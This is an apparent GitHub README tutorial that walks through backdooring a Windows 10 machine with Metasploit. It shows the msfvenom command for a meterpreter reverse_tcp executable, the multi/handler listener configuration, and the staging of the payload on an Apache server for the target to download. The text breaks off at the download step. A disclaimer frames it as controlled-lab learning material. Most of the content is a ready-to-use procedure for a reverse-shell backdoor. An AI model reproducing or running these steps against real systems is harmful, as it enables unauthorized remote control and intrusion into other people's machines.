<img src="screenshot/metasploit_logo.png" height="150"/>

### Backdoor Windows Exploitation

In this tutorial we are hacking into a Windows 10 machine creating a backdoor exploit with Metasploit Framework.

This repository is dedicated to show how i go through Hacking challenges. 
Created only for learning pourposes and all the solutions and tricks are used at controlled environments.

#### DO NOT HACK WITHOUT PERMISSION ! 

#### Happy Hacking ðŸ˜ƒ


<pre>
 _      _____  _____  _  ____     ____  _____  _____   ____   _____  _  _    ____   _____  _____  ____  
| |    |___ / |_   _|( )/ ___|   / ___||___ / |_   _| / ___| |_   _|| || |  |  _ \ |_   _||___ / |  _ \ 
| |      |_ \   | |  |/ \___ \  | |  _   |_ \   | |   \___ \   | |  | || |_ | |_) |  | |    |_ \ | | | |
| |___  ___) |  | |      ___) | | |_| | ___) |  | |    ___) |  | |  |__   _||  _ <   | |   ___) || |_| |
|_____||____/   |_|     |____/   \____||____/   |_|   |____/   |_|     |_|  |_| \_\  |_|  |____/ |____/ 
                                                                                 
</pre>

### Step 01: Create the payload

For this i'll be using [MSFVENOM](https://www.offsec.com/metasploit-unleashed/msfvenom/)

So... first let's open our terminal and start typing.

````
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=<any-port> -f exe -o /any/path/you/want/<any-name>.exe
````
<img src="screenshot/msfvenom1.png" />

### But, let's break this command down
 - **msfvenom** is a powerful tool within the Metasploit Framework used for generating payloads.
 - **-p windows/meterpreter/reverse_tcp** creates the payload with the connection you need to the Windows machine.
 - **LHOST-<your-ip>** is the host ip, your machine ip that will receive the targets connection.
 - **LPORT-<any-port>** the port where we want to connect back to the target.
 - **-f exe** because we want to create a executable file.
 - **-o /path-to-any-directory-you-want/rs_exploit.exe** is the output directory.

Ok, so this **created the payload** that will get transferred over to your **Windows** target.

<img src="screenshot/exploit_exe.png" />


### Step 02: Set Metasploit handler to listen to the remote connection

Now we need to tell **Metasploit** we're gonna use a **Handler**.

We must make sure that **Metasploit** will listen to the connection.

Start opening [Metasploit Console](https://www.offsec.com/metasploit-unleashed/msfconsole/)

And you can do this by running the following command

````
msfconsole
````
<img src="screenshot/msfconsole.png" />

````
use exploit/multi/handler
````
<img src="screenshot/handler.png" />

Now set the payload type to the Windows interpreter reverse TCP

````
set PAYLOAD windows/meterpreter/reverse_tcp
````

<img src="screenshot/set_payload.png" />

Now you can check this out:

<img src="screenshot/show_options.png" />

As you can see, there's empty **LHOST** and **LPORT**.

You need to set those values in order to make sure Metasploit understands where we are listening for this connection.

<img src="screenshot/LHOST_RHOST.png" />

Now you can **show options** again:

<img src="screenshot/show_options_02.png" />

Now, it's time to run the exploit!!!!!

````
exploit
````
<img src="screenshot/exploit.png" />


This starts the listener, that is waiting for the Windows target's machine connection.


### Step 03: Sending the file to the Windows machine

So, you need to send this file somehow to your target's Windows machine so you can exploit it.

In this study case, i'll be using apache server for downloading the file into the target's machine.

So, if you remember, we saved the file at our Desktop, and now we need to copy it to our apache server.

You can do this using **"cp"** to copy the file. 

````
sudo cp ~/Desktop/exploit.exe /var/www/html/
````
<img src="screenshot/cp.png" />

You can check out to see if the file has been copied successfully.

<img src="screenshot/ls.png" />


### Step 04: Downloading infected file





